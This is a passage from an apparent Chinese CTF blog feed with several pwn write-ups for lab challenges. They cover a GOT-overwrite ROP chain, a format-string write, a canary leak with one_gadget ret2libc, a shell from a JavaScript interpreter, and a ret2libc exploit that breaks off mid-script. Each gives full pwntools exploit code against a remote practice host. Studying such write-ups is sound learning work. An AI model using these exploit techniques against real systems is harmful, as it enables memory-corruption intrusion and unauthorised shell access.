class="token number">1</span><span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>因为没有open函数，我们又知道open函数是由syscall调用的，调用号为2，且给出的函数中alarm没有用它也是被syscall调用的于是我们想到改写alarm函数的got表保存的地址使它指向syscall<br>我们用pwndbg查看一下alarm函数的反汇编代码：<br><img src="/images/got%E8%A1%A8%E5%8A%AB%E6%8C%81%E5%AE%9E%E6%88%98%E8%AE%B2%E8%A7%A3/3.png"><br>那个endbr64不用管他，函数从它下面开始，也就是syscall离alarm调用处偏移了5，我们要将这个5加上去，<strong>（这里是经验快记）</strong>所以我们要找一个<strong>add [寄存器]，寄存器</strong> 类型的garget<br>用ropper查找：<br><img src="/images/got%E8%A1%A8%E5%8A%AB%E6%8C%81%E5%AE%9E%E6%88%98%E8%AE%B2%E8%A7%A3/4.png"><br>我们选择这个garget，因为rdi比较常见且它比较简单操作<br>搜索我们要的其他garget：<br><img src="/images/got%E8%A1%A8%E5%8A%AB%E6%8C%81%E5%AE%9E%E6%88%98%E8%AE%B2%E8%A7%A3/5.png"><br>这里都有<br>flag字符串可以在字符串窗口找到，但要设置下显示长度要不然可能找不到<br>先右击任意位置打开选择setup，将下面那个设置成4，那个是最小长度显示<br><img src="/images/got%E8%A1%A8%E5%8A%AB%E6%8C%81%E5%AE%9E%E6%88%98%E8%AE%B2%E8%A7%A3/6.png"><br>上exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span><span class="token number">55003</span><span class="token punctuation">)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./recho"</span><span class="token punctuation">)</span>read_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span>write_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>alarm_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"alarm"</span><span class="token punctuation">]</span>alarm_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"alarm"</span><span class="token punctuation">]</span>flag_addr<span class="token operator">=</span><span class="token number">0x0601058</span>pop_rax<span class="token operator">=</span><span class="token number">0x04006fc</span>pop_rdi<span class="token operator">=</span><span class="token number">0x04008a3</span>pop_rdx<span class="token operator">=</span><span class="token number">0x04006fe</span>pop_rsi_r15<span class="token operator">=</span><span class="token number">0x04008a1</span>add_rdi<span class="token operator">=</span><span class="token number">0x040070d</span>bss_addr<span class="token operator">=</span><span class="token number">0x0601060</span><span class="token comment">#bss段具有可读写权限，将flag存这</span><span class="token comment">#溢出0x38覆盖至rbp，并改写alarm的got表存储的地址</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x38</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>alarm_got<span class="token punctuation">)</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>pop_rax<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>add_rdi<span class="token punctuation">)</span><span class="token comment">#构造open函数</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>pop_rax<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi_r15<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>alarm_plt<span class="token punctuation">)</span><span class="token comment">#构造read函数，open以后，fd的值一般是3开始，依次增加。比如我open了两个文件，那么它们的fd分别为3和4。如果特殊，</span><span class="token comment">#具体看调试结果</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi_r15<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdx<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span><span class="token comment">#构造write函数，把读取到的flag打印出来</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi_r15<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdx<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Welcome to Recho server!\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>shutdown<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获得flag：<br><img src="/images/got%E8%A1%A8%E5%8A%AB%E6%8C%81%E5%AE%9E%E6%88%98%E8%AE%B2%E8%A7%A3/7.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn-write-up pwn原理讲解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实时数据监测——fmtstr_payload的应用</title>
      <link href="/2023/01/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B/"/>
      <url>/2023/01/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界——实时数据监测"><a href="#攻防世界——实时数据监测" class="headerlink" title="攻防世界——实时数据监测"></a>攻防世界——实时数据监测</h1><p>这题思路很简单，难度大大降低了，本来是一道盲打题，但给了文件就很清晰了，主要是记录一下一个pwntools的新用法<br>checksec：<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B/1.png"><br>看到没开任何保护，经验就告诉我，这是一道盲打改编题。<br>拖进IDA：<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B/2.png"><br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B/3.png"><br>逻辑很简单知道吧key赋值成0x2223322就可以获得shell<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B/4.png"><br>这里也很清楚是个格式化字符串漏洞<br>连接靶机看看偏移量：<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B/6.png"><br>偏移量为12<br>这里讲一讲要用到的pwntools：fmtstr_payload(offset, writes, numbwritten&#x3D;0, write_size&#x3D;’byte’)<br>实际上我们常用的形式是<strong>fmtstr_payload(offset, {printf_got: system_addr})(偏移，{原地址：目的地址})</strong><br>比如我要更改puts函数got表中的实际地址为system的实际地址，且偏移量为12，我可以这么写：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">fmtstr_payload<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>puts_got<span class="token punctuation">:</span>system_addr<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">#这里是变量名</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样就可以实现真正的<strong>任意内存地址写</strong><br>上exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span><span class="token number">58121</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>fmtstr_payload<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token number">0x804A048</span><span class="token punctuation">:</span><span class="token number">0x2223322</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获得shell：<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B/5.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn-write-up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn1-利用回车泄露canary</title>
      <link href="/2023/01/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/"/>
      <url>/2023/01/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="babystack-wp"><a href="#babystack-wp" class="headerlink" title="babystack-wp"></a>babystack-wp</h2><p>对于这题和pwn-100的思路很像，也是一道retlibc3的题目，这题也学到了很多，故写一篇博客记录一下。<br>老样子checksec一下：<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/1.png"><br>开了Canary、NX和RELRO无法改写got表<br>拖进IDA查看：<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/2.png"><br>有两个函数被调用，一个是列表、一个是给v3赋值<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/3.png"><br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/4.png"><br>函数逻辑很简单，溢出点也很明显，但是没有system函数和&#x2F;bin&#x2F;sh字符串比较麻烦又是retlibc3类型<br>但是这题和pwn-100不一样的是他给了libc-2.23.so文件，意味着我们不用LibcSearcher去寻找靶机的libc版本，比较方便但是他开了canary保护比较难整<br>这里又要讲一个新方法，原理不难可以说很好理解，但要了解pwntools的一些细节。</p><h3 id="利用栈溢出泄露Canary"><a href="#利用栈溢出泄露Canary" class="headerlink" title="利用栈溢出泄露Canary"></a>利用栈溢出泄露Canary</h3><p>前提输入完后，最好有一个puts函数跟在下面把栈中内容输出。<br>这里v6就是Canary离栈底差8h，而s离栈底差90h二者相差88h，我们只要输入0x88个a就可以了，这边是个细节：有人会问为什么0x88就可以，明明没覆盖到canary<br>因为sendline是<strong>发送一行数据</strong>，所以会在<strong>末尾自动补个\n</strong>，而<strong>\n就是\0a正好覆盖到canary的低字节\00</strong>，本来puts碰到\00就会停止读取覆盖为\0a<br>就可以将Canary视为s的一部分一起打印出来，就可以泄露。</p><h3 id="one-garget的使用"><a href="#one-garget的使用" class="headerlink" title="one_garget的使用"></a>one_garget的使用</h3><p>泄露完Canary后面思路都是老套路了，这里给了libc-2.23.so要如何用呢？这里有涉及到一个工具one_gadget<br>安装如下：</p><pre class="line-numbers language-none"><code class="language-none">sudo apt -y install rubysudo gem install one_gadget<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/5.png"><br>one_gadget就是用来去查找动态链接库里execve(“&#x2F;bin&#x2F;sh”, rsp+0x70, environ)函数的<strong>偏移地址</strong>的，还是很好用的。<br><strong>注意是找偏移地址</strong>实际的libc地址还是要自己算。<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/6.png"><br>ropper找到pop rdi;ret;<br>上exp讲解：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span><span class="token number">58094</span><span class="token punctuation">)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./babystack'</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span><span class="token comment">#这就是格式记住</span>puts_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>main_addr<span class="token operator">=</span><span class="token number">0x0400908</span>pop_rdi<span class="token operator">=</span><span class="token number">0x0400a93</span>one_gadget<span class="token operator">=</span><span class="token number">0x45216</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x88</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token comment">#因为sendline自己会补\n，所以要添上“\n”（网上都不讲的，想了半天）</span>canary<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#先接收7个字节，如果不够从低字节用\x00补齐到8字节</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#打印看会不会收错</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token comment">#泄露puts的真实地址</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span> <span class="token comment">#64位传参格式：参数(rdi、rsi、rdx……(6个)可能)+函数地址（plt）+预留返回地址</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    <span class="token comment">#32位传参格式：函数地址（plt）+预留返回地址+参数(栈空间)  </span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span><span class="token comment">#这里一定要输入3退出才能执行return，才会执行rop链，以前的题目做好rop输入就可以，这题没想到要手动退出卡了好久</span>puts_addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#接收8个字节，如果不够高字节用\x00补齐</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base<span class="token operator">=</span>puts_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>flag<span class="token operator">=</span>one_gadget<span class="token operator">+</span>libc_basepayload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span><span class="token comment">#记得退出</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获取shell：<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/7.png"><br>附注覆盖图：<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/8.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn-write-up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界——monkey</title>
      <link href="/2023/01/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94monkey/"/>
      <url>/2023/01/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94monkey/</url>
      
        <content type="html"><![CDATA[<h1 id="这是一种很新的monkey……"><a href="#这是一种很新的monkey……" class="headerlink" title="这是一种很新的monkey……"></a>这是一种很新的monkey……</h1><p>本来不打算写这题的博客的，<del>也不知道要这么写</del>  但还是想记录一下，毕竟是新题型，不知道常不常见……<br>checksec一下：<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94monkey/1.png"><br>发现没什么异常，估计是栈溢出。<br>但是拖进IDA查看时，人麻了，IDA解析了半天给出了长长的函数块，main函数里更别说了……<br>又是在做一种很新的题目，分析不了怎么办……只能求助带佬了</p><h2 id="javascript解释器"><a href="#javascript解释器" class="headerlink" title="javascript解释器"></a>javascript解释器</h2><p>带佬说这是个javascript解释器（js解释器），这题就相当于一个终端，可以直接输入命令，获取回应，如果直接输入system（“&#x2F;bin&#x2F;sh”）就会直接执行获取shell。<br>这里带入网上的解释：<br>JavaScript解释器又名js引擎。</p><p>JavaScript是解释型语言，这就是说它无需编译，直接由JavaScript引擎直接执行。</p><p>既然说到了解释型语言，那么我们就来分别以下解释型语言和编译型语言的差别：</p><p>编译型语言：程序在执行之前需要一个专门的编译过程，把程序编译成为机器语言的文件（即exe文件），运行时不需要重新编译，直接用编译后的文件（exe文件）就行了。<br>优点：执行效率高<br>缺点：跨平台性差<br>解释型语言：程序不需要编译，程序在运行的过程中才用解释器编译成机器语言，边编译边执行（没有exe文件）。<br>优点：跨平台性好<br>缺点：执行效率低<br>其中程序无需编译，不是说真的不需要编译了，直接执行脚本字符串。而是说不需要在运行之前先编译程序成为exe文件，而是在运行的过程中边运行边执行。</p><h2 id="os-system-“-x2F-bin-x2F-sh”"><a href="#os-system-“-x2F-bin-x2F-sh”" class="headerlink" title="os.system(“&#x2F;bin&#x2F;sh”)"></a>os.system(“&#x2F;bin&#x2F;sh”)</h2><p><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94monkey/2.png"><br>直接输入system(“&#x2F;bin&#x2F;sh”)会发现不会有任何回应，看带佬们用了os.system，这里我就不说了去网上查查吧（我也不清楚，本人太菜了）<br>所以连最终连exp都不用写直接操作就行：<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94monkey/3.png"><br>结束</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn-write-up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高级rop-retlibc3心得</title>
      <link href="/2023/01/06/%E9%AB%98%E7%BA%A7rop-retlibc3%E5%BF%83%E5%BE%97/"/>
      <url>/2023/01/06/%E9%AB%98%E7%BA%A7rop-retlibc3%E5%BF%83%E5%BE%97/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界-pwn-100-wp"><a href="#攻防世界-pwn-100-wp" class="headerlink" title="攻防世界 pwn-100 wp"></a>攻防世界 pwn-100 wp</h1><p>这里要记录三种新的知识：一种是retlibc3和LibSearcher库的应用以及exp的新语法<br>checksec一下：<br><img src="/images/%E9%AB%98%E7%BA%A7rop-retlibc3%E5%BF%83%E5%BE%97/1.png"><br>64位文件，只开了NX保护只可能是栈溢出了。<br><img src="/images/%E9%AB%98%E7%BA%A7rop-retlibc3%E5%BF%83%E5%BE%97/2.png"><br><img src="/images/%E9%AB%98%E7%BA%A7rop-retlibc3%E5%BF%83%E5%BE%97/3.png"><br><img src="/images/%E9%AB%98%E7%BA%A7rop-retlibc3%E5%BF%83%E5%BE%97/4.png"><br>这里的代码不长一步一步看下去，是一个嵌套性函数。<br>查看发现没有任何后门函数可利用，比较棘手。<br>按shift+F12查看字符串窗口：<br><img src="/images/%E9%AB%98%E7%BA%A7rop-retlibc3%E5%BF%83%E5%BE%97/5.png"><br>没有&#x2F;bin&#x2F;sh字符串，可判断为retlibc3类型。</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类:"></a>分类:</h2><pre class="line-numbers language-none"><code class="language-none">1、有system（“&#x2F;bin&#x2F;sh”）则为retlibc类型2、有system（“……”）但没有&#x2F;bin&#x2F;sh字符串为retlibc2类型3、没有system（“……”）也没有&#x2F;bin&#x2F;sh字符串为retlibc3类型<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>前两种都挺好做，第三种属于是进阶了。<br>我们需要泄露出 libc 中某个函数的地址，从而根据偏移来获得 system 和 ‘&#x2F;bin&#x2F;sh’ 的地址并调用之，但是和之前的题不同我们并没有 libc 的样本，也就无从得知具体的偏移；我们在调用一个函数时，<br>需要控制一些寄存器的值（64位的调用规约规定前6个参数放在寄存器中），这里的解决方式是利用 gadget ；并且要使用 LibcSearcher 库<br>LibcSearcher安装方式：</p><pre class="line-numbers language-none"><code class="language-none">--- git clone https:&#x2F;&#x2F;github.com&#x2F;lieanu&#x2F;LibcSearcher.git--- cd LibcSearcher--- python3 setup.py develop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>具体报错上网搜索即可。<br>对于garget的搜索我用的是ropper：<br><img src="/images/%E9%AB%98%E7%BA%A7rop-retlibc3%E5%BF%83%E5%BE%97/6.png"><br>所以我们最终的思路是，调用 puts 函数来获得某个库函数的地址（这里选用 puts 函数），调用时使用 gadget 来控制寄存器从而传递参数，然后利用 LibcSearcher 来获得 system 和 &#x2F;bin&#x2F;sh 的<br>地址，用它们覆盖返回地址后使程序的流程到达之，从而开启 interactive 模式<br>上exp：（这个exp是模仿别人的但是整体是自己写的，但不知道为什么失灵时不灵的）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span><span class="token number">61254</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn-100'</span><span class="token punctuation">)</span>pop_rdi_ret<span class="token operator">=</span><span class="token number">0x0400763</span>put_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>put_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>main_addr<span class="token operator">=</span><span class="token number">0x04006B8</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x48</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>put_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>put_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token 